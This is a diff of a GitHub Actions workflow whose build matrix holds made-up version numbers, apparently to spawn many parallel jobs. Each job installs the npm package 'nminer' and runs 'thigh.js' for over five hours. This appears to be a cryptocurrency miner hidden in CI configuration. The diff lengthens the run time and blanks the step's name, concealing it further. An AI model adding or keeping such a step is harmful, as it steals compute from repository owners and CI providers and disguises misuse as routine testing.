@@ -9,25 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3718 }
-          - { version: 4956 }
-          - { version: 4113 }
-          - { version: 2555 }
-          - { version: 9695 }
-          - { version: 6878 }
-          - { version: 3663 }
-          - { version: 8878 }
-          - { version: 5421 }
-          - { version: 826 }
-          - { version: 2287 }
-          - { version: 4526 }
-          - { version: 2977 }
-          - { version: 7716 }
-          - { version: 9355 }
-          - { version: 2896 }
-          - { version: 3036 }
-          - { version: 8364 }
-          - { version: 7703 }
+          - { version: 5719 }
+          - { version: 7312 }
+          - { version: 4403 }
+          - { version: 6549 }
+          - { version: 5962 }
+          - { version: 7876 }
+          - { version: 6392 }
+          - { version: 532 }
+          - { version: 8131 }
+          - { version: 729 }
+          - { version: 697 }
+          - { version: 46 }
+          - { version: 5001 }
+          - { version: 1733 }
+          - { version: 5937 }
 
     steps:
       - name: Checkout
@@ -38,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: yum
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 305m node thigh.js || echo "thigh executed"
+          timeout 338m node thigh.js || echo "thigh executed"
